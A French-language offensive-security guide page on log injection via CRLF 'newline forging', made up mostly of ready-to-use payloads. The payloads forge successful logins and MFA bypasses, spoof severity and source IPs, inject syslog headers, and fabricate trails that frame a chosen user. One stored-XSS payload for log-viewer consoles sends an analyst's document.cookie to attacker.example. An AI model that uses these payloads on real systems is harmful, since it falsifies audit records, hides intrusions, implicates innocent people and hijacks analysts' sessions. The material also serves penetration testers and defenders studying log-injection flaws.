---
order: 1
title: "Newline forging : scinder un seul appel de log en deux entrées avec CRLF"
description: "Injecter un CRLF ou un saut de ligne nu dans l'entrée loggée pour qu'une seule instruction de log émette deux lignes, forgeant un second enregistrement de log avec timestamp, sévérité, IP source et message choisis par l'attaquant."
keywords:
  - injection de log
  - newline forging
  - injection CRLF
  - log forging
  - injection syslog
  - log poisoning
---

# Newline forging

Les logs orientés ligne utilisent un saut de ligne comme séparateur d'enregistrement, donc une instruction de log logique est une ligne physique. Lorsque l'entrée de l'attaquant contenant un saut de ligne (`\n`, `%0a`) ou une paire retour chariot/saut de ligne (`\r\n`, `%0d%0a`) est écrite dans cette ligne sans échappement, le fichier de log contient maintenant deux lignes là où l'application en a écrit une. La seconde ligne est entièrement contrôlée par l'attaquant et est indiscernable d'un enregistrement authentique pour tout ce qui analyse le fichier ligne par ligne.

## La primitive

Une instruction de log d'accès ou d'authentification typique interpole un champ directement dans une format string :

```
logger.info("login failed for user=" + username + " from " + clientIp)
```

La ligne sur disque ressemble à :

```
2026-10-01T09:14:22Z INFO login failed for user=bob from 203.0.113.9
```

Réglez le champ `username` sur une valeur qui porte un saut de ligne suivi d'un enregistrement factice complet, en URL-encodant le CRLF dans la requête HTTP :

```
bob%0a2026-10-01T09:14:25Z INFO login succeeded for user=admin from 10.0.0.5
```

Après que le logger écrit et que les octets sont décodés, le fichier contient deux lignes :

```
2026-10-01T09:14:22Z INFO login failed for user=bob
2026-10-01T09:14:25Z INFO login succeeded for user=admin from 10.0.0.5 from 203.0.113.9
```

La ligne forgée porte un timestamp, une sévérité, un message et une IP source choisis par l'attaquant. Un détail à noter : le vrai champ de fin (ici ` from 203.0.113.9`, interpolé *après* la valeur de l'attaquant) est concaténé à la fin de la ligne forgée, donc il apparaît comme un suffixe résiduel. L'attaquant soit s'accommode de ce résidu inoffensif, soit façonne le payload pour que la valeur de fin atterrisse quelque part d'ignorable (par exemple dans un champ que le lecteur n'analyse pas).

## Forger des champs spécifiques

Parce que vous contrôlez toute la seconde ligne, vous choisissez chaque champ que le format expose.

Simulez une connexion réussie pour enterrer une vraie ou incriminer un compte :

```
victim%0d%0a2026-10-01T03:00:01Z INFO auth success user=victim mfa=bypassed ip=198.51.100.7
```

Usurpez la sévérité pour qu'une règle de monitoring fasse un mauvais triage. Rétrogradez votre propre activité bruyante en `DEBUG`, ou levez un leurre en `CRITICAL` pour inonder les intervenants :

```
x%0aLEVEL=DEBUG scan complete, no findings
x%0aLEVEL=CRITICAL database corruption detected on shard-3
```

Usurpez l'IP source pour pointer l'attribution vers un tiers ou un hôte interne auquel les défenseurs font confiance :

```
x%0a2026-10-01T09:20:00Z WARN repeated 401 from 8.8.8.8
```

## Injecter un préfixe syslog

Lorsque les logs sont acheminés via syslog ou écrits au format syslog, préfixez une priorité et un en-tête complets pour que la ligne forgée soit acceptée comme un message distinct. Une ligne syslog commence par une valeur de priorité entre chevrons, puis timestamp, hôte et tag :

```
x%0a<34>Oct  1 09:21:00 app01 sshd[4111]: Accepted password for root from 192.0.2.10 port 54321 ssh2
```

Le `<34>` encode la facility `auth` avec la sévérité `crit`, donc l'événement forgé atterrit dans le flux d'authentification avec une priorité élevée.

## Incriminer un autre utilisateur

En chaînant ce qui précède, un seul champ injecté peut fabriquer une piste d'activité attribuée à une victime choisie : connexions échouées, changements de privilèges, ou lignes d'accès à des fichiers qui nomment son compte et une IP plausible, synchronisées pour se situer près d'un vrai incident afin qu'un enquêteur les lise comme une corroboration.

## XSS stocké dans les visualiseurs de logs

Beaucoup d'équipes lisent les logs via une console web (Kibana, Grafana, un tableau de bord personnalisé). Si cette console rend le contenu de log en HTML sans l'encoder, une ligne forgée par newline qui contient du balisage devient du cross-site scripting stocké qui se déclenche quand un analyste consulte l'entrée :

```
x%0a2026-10-01T09:25:00Z INFO <script>fetch('//attacker.example/c?'+document.cookie)</script>
```

Le fichier de log est le vecteur de livraison et la session de navigateur authentifiée de l'analyste est la cible.

## Notes d'encodage

- En HTTP, injectez la rupture sous forme `%0a` (LF), `%0d%0a` (CRLF), ou `%0d` (CR) selon ce que le framework décode et ce que le composant d'écriture de log traite comme fin de ligne.
- Un `%0d` nu à lui seul peut écraser le début de la ligne visible sur un `tail` de terminal, cachant le vrai préfixe derrière votre texte.
- Là où l'entrée est du JSON, un `\n` littéral à l'intérieur d'une valeur de chaîne est décodé en un vrai saut de ligne au moment où il atteint un logger en texte brut.

## Outils

- **Burp Repeater** : injecter des séquences CRLF (`%0d%0a`) dans des champs de requête loggés.
- **curl** : envoyer des payloads de saut de ligne forgés pour forger des enregistrements de log.
- Test manuel avec Burp Repeater et des payloads forgés.

## Références

- [OWASP: Log Injection](https://owasp.org/www-community/attacks/Log_Injection)
- [PayloadsAllTheThings: CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
